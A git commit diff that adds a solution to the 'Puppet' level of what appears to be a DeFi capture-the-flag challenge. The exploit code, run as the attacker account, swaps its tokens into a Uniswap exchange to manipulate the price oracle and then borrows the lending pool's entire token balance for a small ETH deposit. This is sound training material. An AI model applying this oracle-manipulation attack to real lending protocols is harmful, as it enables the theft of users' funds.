50ae169d260eb494026d8b3a21cfe66c12504251
Crys <mariano.christopher123@gmail.com>
2023-02-06 14:17:34 +0800

    updated level 8

--- test/puppet/puppet.challenge.js
+++ test/puppet/puppet.challenge.js
@@ -137,6 +137,33 @@ describe("[Challenge] Puppet", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+    // connecting attacker to contracts
+    const attackToken = this.token.connect(attacker);
+    const attackUniswapExchange = this.uniswapExchange.connect(attacker);
+    const attackLendingPool = this.lendingPool.connect(attacker);
+    // approve token spending here
+    await attackToken.approve(
+      this.uniswapExchange.address,
+      ATTACKER_INITIAL_TOKEN_BALANCE
+    );
+    // swapping all tokens for ETH to manipulate price
+    await attackUniswapExchange.tokenToEthSwapInput(
+      ATTACKER_INITIAL_TOKEN_BALANCE.sub("1"), // to satisfy condition
+      1, // any ETH to get back is ok
+      9999999999 // any deadline will do
+    );
+    const deposit = await this.lendingPool.calculateDepositRequired(
+      POOL_INITIAL_TOKEN_BALANCE
+    );
+    console.log(
+      `Deposit Required: ${deposit} wei or ${ethers.utils.formatEther(
+        deposit.toString()
+      )} ETH`
+    );
+    // barrowing all the tokens with our ETH
+    await attackLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+      value: deposit,
+    });
   });
 
   after(async function () {
